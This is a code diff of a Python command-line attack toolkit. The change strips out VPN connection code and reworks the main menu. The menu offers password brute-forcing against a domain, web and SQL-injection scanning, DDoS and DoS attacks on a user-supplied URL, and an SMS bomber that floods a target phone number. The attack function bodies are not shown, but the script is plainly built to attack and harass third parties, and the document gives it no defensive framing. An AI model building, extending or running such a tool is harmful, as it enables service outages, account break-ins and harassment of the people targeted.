@@ -1,4 +1,3 @@
-import pyvpn
 import logging
 import socket
 import subprocess
@@ -13,23 +12,6 @@ import json
 import threading
 
 logging.basicConfig(filename='bruteforce_success.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-# VPN Configuration
-vpn_config = {
-    'server': 'vpn.example.com',
-    'username': 'your_username',
-    'password': 'your_password'
-}
-
-def connect_vpn(config):
-    vpn = pyvpn.VPN(config['server'], config['username'], config['password'])
-    vpn.connect()
-    print("Connected to VPN")
-    return vpn
-
-def disconnect_vpn(vpn):
-    vpn.disconnect()
-    print("Disconnected from VPN")
 
 def get_ip_address(domain):
     try:
@@ -184,96 +166,86 @@ def sms_bomber(phone_number, message, count):
             print(f"Error: {e}")
 
 def main():
-    vpn = connect_vpn(vpn_config)
-    try:
-        while True:
-            print("Choose an option:")
-            print("1. Brute Force")
-            print("2. Web")
-            print("3. SQL")
-            print("4. DDoS Attack")
-            print("5. DoS Attack")
-            print("6. SMS Bomber")
-            print("7. VPN")
-            print("8. Exit")
+    while True:
+        print("Choose an option:")
+        print("1. Brute Force")
+        print("2. Web")
+        print("3. SQL")
+        print("4. DDoS Attack")
+        print("5. DoS Attack")
+        print("6. SMS Bomber")
+        print("7. Exit")
 
-            choice = input("Enter your choice (1, 2, 3, 4, 5, 6, 7 or 8): ")
+        choice = input("Enter your choice (1, 2, 3, 4, 5, 6 or 7): ")
 
-            if choice == '1':
-                domain, username = prompt_for_input()
-                wordlist_path = f'{username}_rockyou.txt'
-                generate_passwords(wordlist_path)
-                ip_address = get_ip_address(domain)
-                if not ip_address:
-                    print(f"{domain}: Unable to find IP address")
-                    sys.exit(1)
-                brute_force(ip_address, username, wordlist_path)
+        if choice == '1':
+            domain, username = prompt_for_input()
+            wordlist_path = f'{username}_rockyou.txt'
+            generate_passwords(wordlist_path)
+            ip_address = get_ip_address(domain)
+            if not ip_address:
+                print(f"{domain}: Unable to find IP address")
+                sys.exit(1)
+            brute_force(ip_address, username, wordlist_path)
 
-            elif choice == '2':
+        elif choice == '2':
+            domain = input("Please enter a domain: ")
+            ip_address = get_ip_address(domain)
+            if ip_address:
+                print(f"{domain}: {ip_address}")
+                domain_info = get_domain_info(domain)
+                server_info = get_server_info(ip_address)
+                print(f"Domain Info: {domain_info}")
+                print(f"Server Info: {json.dumps(server_info, indent=2)}")
+                save_to_json(domain, domain_info, server_info)
+            else:
+                print(f"{domain}: Unable to find IP address")
+
+        elif choice == '3':
+            scan_choice = input("Choose a scan type: (1) nmap, (2) nikto, (3) wpscan, (4) sqlmap: ")
+            if scan_choice == '1':
                 domain = input("Please enter a domain: ")
                 ip_address = get_ip_address(domain)
                 if ip_address:
-                    print(f"{domain}: {ip_address}")
-                    domain_info = get_domain_info(domain)
-                    server_info = get_server_info(ip_address)
-                    print(f"Domain Info: {domain_info}")
-                    print(f"Server Info: {json.dumps(server_info, indent=2)}")
-                    save_to_json(domain, domain_info, server_info)
+                    nmap_scan(ip_address)
                 else:
                     print(f"{domain}: Unable to find IP address")
-
-            elif choice == '3':
-                scan_choice = input("Choose a scan type: (1) nmap, (2) nikto, (3) wpscan, (4) sqlmap: ")
-                if scan_choice == '1':
-                    domain = input("Please enter a domain: ")
-                    ip_address = get_ip_address(domain)
-                    if ip_address:
-                        nmap_scan(ip_address)
-                    else:
-                        print(f"{domain}: Unable to find IP address")
-                elif scan_choice == '2':
-                    url = input("Please enter a URL to scan with nikto: ")
-                    nikto_scan(url)
-                elif scan_choice == '3':
-                    url = input("Please enter a URL to scan with wpscan: ")
-                    wpscan(url)
-                elif scan_choice == '4':
-                    url = input("Please enter a URL to scan with sqlmap: ")
-                    sqlmap_scan(url)
-                else:
-                    print("Invalid scan type choice.")
-                    sys.exit(1)
-
-            elif choice == '4':
-                url = input("Please enter a URL to attack: ")
-                threads = int(input("Enter number of threads: "))
-                ddos_attack(url, threads)
-
-            elif choice == '5':
-                url = input("Please enter a URL to attack: ")
-                rate_limit = int(input("Enter rate limit in seconds: "))
-                delay_range = (int(input("Enter minimum delay in seconds: ")), int(input("Enter maximum delay in seconds: "))
-                dos_attack(url, rate_limit, delay_range)
-
-            elif choice == '6':
-                phone_number = input("Please enter the target phone number: ")
-                message = input("Enter the message to send: ")
-                count = int(input("Enter the number of messages to send: "))
-                sms_bomber(phone_number, message, count)
-
-            elif choice == '7':
-                vpn = connect_vpn(vpn_config)
-                input("VPN connected. Press Enter to disconnect.")
-                disconnect_vpn(vpn)
-
-            elif choice == '8':
-                print("Exiting...")
-                sys.exit(0)
-
+            elif scan_choice == '2':
+                url = input("Please enter a URL to scan with nikto: ")
+                nikto_scan(url)
+            elif scan_choice == '3':
+                url = input("Please enter a URL to scan with wpscan: ")
+                wpscan(url)
+            elif scan_choice == '4':
+                url = input("Please enter a URL to scan with sqlmap: ")
+                sqlmap_scan(url)
             else:
-                print("Invalid choice. Please enter 1, 2, 3, 4, 5, 6, 7 or 8.")
-    finally:
-        disconnect_vpn(vpn)
+                print("Invalid scan type choice.")
+                sys.exit(1)
+
+        elif choice == '4':
+            url = input("Please enter a URL to attack: ")
+            threads = int(input("Enter number of threads: "))
+            ddos_attack(url, threads)
+
+        elif choice == '5':
+            url = input("Please enter a URL to attack: ")
+            rate_limit = int(input("Enter rate limit in seconds: "))
+            delay_range = (int(input("Enter minimum delay in seconds: ")), int(input("Enter maximum delay in seconds: ")))
+            dos_attack(url, rate_limit, delay_range)
+
+        elif choice == '6':
+            phone_number = input("Please enter the target phone number: ")
+            message = input("Enter the message to send: ")
+            count = int(input("Enter the number of messages to send: "))
+            sms_bomber(phone_number, message, count)
+
+        elif choice == '7':
+            print("Exiting...")
+            sys.exit(0)
+
+        else:
+            print("Invalid choice. Please enter 1, 2, 3, 4, 5, 6 or 7.")
 
 if __name__ == '__main__':
     main()
